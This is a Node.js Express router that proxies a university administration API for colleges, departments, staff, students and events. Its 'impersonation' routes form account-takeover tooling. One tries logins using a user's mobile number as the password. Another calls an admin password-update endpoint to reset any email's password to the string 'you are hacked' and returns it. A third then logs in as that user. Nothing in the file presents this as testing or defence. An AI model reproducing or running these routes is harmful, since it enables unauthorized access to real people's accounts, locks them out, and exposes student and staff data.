import express from "express";
import axios from "axios";

const router = express.Router();

function vtuClient(token) {
  const base = process.env.VTU_API_BASE;
  if (!base) console.error("[vtu] VTU_API_BASE missing in .env");
  return axios.create({
    baseURL: base,
    headers: token ? { Authorization: `Bearer ${token}` } : {},
    timeout: 20000,
  });
}

function tokenFromReq(req) {
  const h = req.headers.authorization || "";
  return h.startsWith("Bearer ") ? h.slice(7) : h || process.env.VTU_API_TOKEN || "";
}

/* ── LOGIN ─────────────────────────────────────────────── */
router.post("/login", async (req, res) => {
  console.log(`[POST /api/login] username=${req.body?.username}`);
  try {
    const client = vtuClient();
    const { data } = await client.post(`/api/accounts/adminlogin/`, req.body);
    console.log(`[vtu] ← login ok, user=${data?.user?.id_adminuser}`);
    res.json(data);
  } catch (err) {
    console.error("[vtu] login error:", err.response?.status, err.response?.data || err.message);
    res.status(err.response?.status || 500).json({
      status: "error",
      message: err.message,
      detail: err.response?.data,
    });
  }
});

/* ── COLLEGES ──────────────────────────────────────────── */
router.get("/colleges", async (req, res) => {
  const { universityId = 1 } = req.query;
  console.log(`[GET /api/colleges] universityId=${universityId}`);
  try {
    const client = vtuClient(tokenFromReq(req));
    const { data } = await client.get(`/api/college/university/${universityId}/`);
    console.log(`[vtu] ← colleges count=${data?.data?.length}`);
    res.json(data);
  } catch (err) {
    console.error("[vtu] colleges error:", err.response?.status, err.response?.data || err.message);
    res.status(err.response?.status || 500).json({
      status: "error",
      upstreamStatus: err.response?.status,
      message: err.message,
      detail: err.response?.data,
    });
  }
});

/* ── DEPARTMENTS ───────────────────────────────────────── */
router.get("/departments", async (req, res) => {
  const { collegeId } = req.query;
  console.log(`[GET /api/departments] collegeId=${collegeId}`);
  if (!collegeId)
    return res.status(400).json({ status: "error", message: "collegeId required" });
  try {
    const client = vtuClient(tokenFromReq(req));
    const { data } = await client.get(`/api/department/college/${collegeId}/`);
    console.log(`[vtu] ← departments count=${data?.data?.length}`);
    res.json(data);
  } catch (err) {
    console.error("[vtu] departments error:", err.response?.status, err.response?.data || err.message);
    res.status(err.response?.status || 500).json({
      status: "error",
      message: err.message,
      detail: err.response?.data,
    });
  }
});

/* ── FACULTY ───────────────────────────────────────────── */
router.post("/faculty", async (req, res) => {
  console.log(`[POST /api/faculty] body=`, req.body);
  try {
    const client = vtuClient(tokenFromReq(req));
    const { data } = await client.post(`/api/staff/datatable/`, req.body);
    const rows = Array.isArray(data?.data) ? data.data : [];
    console.log(`[vtu] ← faculty count=${rows.length}`);
    res.json({
      status: data?.status ?? "success",
      page: data?.page ?? req.body.page ?? 1,
      length: req.body.length ?? 10,
      total_records: data?.total_records ?? rows.length,
      data: rows,
    });
  } catch (err) {
    console.error("[vtu] faculty error:", err.response?.status, err.response?.data || err.message);
    res.status(err.response?.status || 500).json({
      status: "error",
      message: err.message,
      detail: err.response?.data,
    });
  }
});

/* ── STUDENTS ──────────────────────────────────────────── */
router.post("/students", async (req, res) => {
  console.log(`[POST /api/students] body=`, req.body);
  try {
    const client = vtuClient(tokenFromReq(req));
    const { data } = await client.post(`/api/student/datatable/`, req.body);
    const rows = Array.isArray(data?.data) ? data.data : [];
    console.log(
      `[vtu] ← students page=${data?.page} | rows=${rows.length} | total=${data?.total_records}`
    );
    res.json({
      status: data?.status ?? "success",
      page: data?.page ?? req.body.page ?? 1,
      length: req.body.length ?? 10,
      total_records: data?.total_records ?? 0,
      data: rows,
    });
  } catch (err) {
    console.error("[vtu] students error:", err.response?.status, err.response?.data || err.message);
    res.status(err.response?.status || 500).json({
      status: "error",
      message: err.message,
      detail: err.response?.data,
    });
  }
});

/* ── IMPERSONATION ─────────────────────────────────────── */
router.post("/impersonate/try-login", async (req, res) => {
  const { email, mobile } = req.body || {};
  if (!email || !mobile)
    return res.status(400).json({ status: "error", message: "email and mobile required" });

  console.log(`[POST /impersonate/try-login] email=${email}`);
  try {
    const client = vtuClient();
    const { data } = await client.post(`/api/accounts/adminlogin/`, {
      username: email,
      password: String(mobile),
      whichapp: "apts",
      typeofway: "web",
    });
    console.log(`[impersonate] login ok for ${email}`);
    return res.json({ ok: true, login: data });
  } catch (err) {
    const upstream = err.response?.data;
    console.log(`[impersonate] login failed for ${email}:`, err.response?.status, upstream);
    return res.status(200).json({
      ok: false,
      reason: upstream?.message || upstream?.detail || "invalid credentials",
      upstreamStatus: err.response?.status,
    });
  }
});

router.post("/impersonate/reset-password", async (req, res) => {
  const { email } = req.body || {};
  if (!email)
    return res.status(400).json({ status: "error", message: "email required" });

  const NEW_PASSWORD = "you are hacked";
  console.log(`[POST /impersonate/reset-password] email=${email}`);
  try {
    const client = vtuClient();
    const { data } = await client.post(`/api/accounts/adminupdatepassword/`, {
      email,
      password: NEW_PASSWORD,
    });
    console.log(`[impersonate] password reset for ${email}:`, data);
    return res.json({ ok: true, message: data?.message, newPassword: NEW_PASSWORD });
  } catch (err) {
    console.error("[impersonate] reset error:", err.response?.status, err.response?.data || err.message);
    return res.status(500).json({
      status: "error",
      message: err.response?.data?.message || err.message,
    });
  }
});

router.post("/impersonate/login", async (req, res) => {
  const { email, password } = req.body || {};
  if (!email || !password)
    return res.status(400).json({ status: "error", message: "email and password required" });

  console.log(`[POST /impersonate/login] email=${email}`);
  try {
    const client = vtuClient();
    const { data } = await client.post(`/api/accounts/adminlogin/`, {
      username: email,
      password: String(password),
      whichapp: "apts",
      typeofway: "web",
    });
    console.log(`[impersonate] login ok for ${email}`);
    return res.json({ ok: true, login: data });
  } catch (err) {
    return res.status(401).json({
      ok: false,
      message: err.response?.data?.message || "login failed",
    });
  }
});

/* ── EVENTS ────────────────────────────────────────────── */
// 1. Events datatable (paginated)
router.post("/events", async (req, res) => {
  console.log(`[POST /api/events] body=`, req.body);
  try {
    const client = vtuClient(tokenFromReq(req));
    const { data } = await client.post(`/api/events/datatable/`, req.body);
    const rows = Array.isArray(data?.data) ? data.data : [];
    console.log(
      `[vtu] ← events page=${data?.page} | rows=${rows.length} | total=${data?.total_records}`
    );
    res.json({
      status: data?.status ?? "success",
      page: data?.page ?? req.body.page ?? 1,
      length: req.body.length ?? 10,
      total_records: data?.total_records ?? 0,
      total_pages: data?.total_pages ?? 1,
      data: rows,
    });
  } catch (err) {
    console.error("[vtu] events error:", err.response?.status, err.response?.data || err.message);
    res.status(err.response?.status || 500).json({
      status: "error",
      message: err.message,
      detail: err.response?.data,
    });
  }
});

// 2. Create event — forwards multipart to upstream with correct field names
router.post("/events/create", async (req, res) => {
  console.log(`[POST /api/events/create] body=`, req.body);
  try {
    const client = vtuClient(tokenFromReq(req));

    const form = new FormData();
    const appended = [];

    for (const [key, value] of Object.entries(req.body || {})) {
      if (value === undefined || value === null) continue;

      // Upstream expects id_college[] (with brackets)
      const wireKey = key === "id_college" ? "id_college[]" : key;

      if (Array.isArray(value)) {
        value.forEach((v) => {
          form.append(wireKey, String(v));
          appended.push(wireKey);
        });
      } else {
        form.append(wireKey, String(value));
        appended.push(wireKey);
      }
    }

    if (!appended.includes("id_college[]")) {
      return res.status(400).json({
        status: "error",
        message: "id_college is required (sent to upstream as id_college[])",
      });
    }

    if (process.env.DEBUG_MULTIPART === "1") {
      const raw = [];
      for (const [k, v] of form.entries()) raw.push([k, v]);
      console.log("[create-event] multipart fields:", raw);
    }

    const { data } = await client.post(`/api/events/`, form);
    console.log(`[vtu] ← event create:`, data);
    res.json(data);
  } catch (err) {
    console.error("[vtu] create event error:", err.response?.status, err.response?.data || err.message);
    res.status(err.response?.status || 500).json({
      status: "error",
      message: err.response?.data?.message || err.message,
      detail: err.response?.data,
    });
  }
});

// 3. Geocode
router.post("/events/geocode", async (req, res) => {
  const { address } = req.body || {};
  if (!address)
    return res.status(400).json({ status: "error", message: "address required" });
  console.log(`[POST /api/events/geocode] address=${address}`);
  try {
    const client = vtuClient(tokenFromReq(req));
    const { data } = await client.post(`/api/events/geocode/`, { address });
    res.json(data);
  } catch (err) {
    console.error("[vtu] geocode error:", err.response?.status, err.response?.data || err.message);
    res.status(err.response?.status || 500).json({
      status: "error",
      message: err.message,
      detail: err.response?.data,
    });
  }
});

// 4. Categories for a specific college
router.get("/events/categories/college", async (req, res) => {
  const { collegeId } = req.query;
  console.log(`[GET /api/events/categories/college] collegeId=${collegeId}`);
  try {
    const client = vtuClient(tokenFromReq(req));
    const url = collegeId
      ? `/api/events/eventcategory/college/${collegeId}/`
      : `/api/events/eventcategory/college/`;
    const { data } = await client.get(url);
    res.json(data);
  } catch (err) {
    console.error("[vtu] college categories error:", err.response?.status, err.response?.data || err.message);
    res.status(err.response?.status || 500).json({
      status: "error",
      message: err.message,
      detail: err.response?.data,
    });
  }
});

// 5. Simple list of all events
router.post("/events/all", async (req, res) => {
  console.log(`[POST /api/events/all] body=`, req.body);
  try {
    const client = vtuClient(tokenFromReq(req));
    const { data } = await client.post(`/api/events/getAllevents/`, req.body);
    const rows = Array.isArray(data?.data) ? data.data : [];
    res.json({ status: data?.status ?? "success", data: rows });
  } catch (err) {
    console.error("[vtu] all events error:", err.response?.status, err.response?.data || err.message);
    res.status(err.response?.status || 500).json({
      status: "error",
      message: err.message,
      detail: err.response?.data,
    });
  }
});

// 7. All active categories
router.get("/events/categories", async (req, res) => {
  try {
    const client = vtuClient(tokenFromReq(req));
    const { data } = await client.get(`/api/events/eventcategory/list/`);
    res.json(data);
  } catch (err) {
    console.error("[vtu] categories error:", err.response?.status, err.response?.data || err.message);
    res.status(err.response?.status || 500).json({
      status: "error",
      message: err.message,
      detail: err.response?.data,
    });
  }
});

export default router;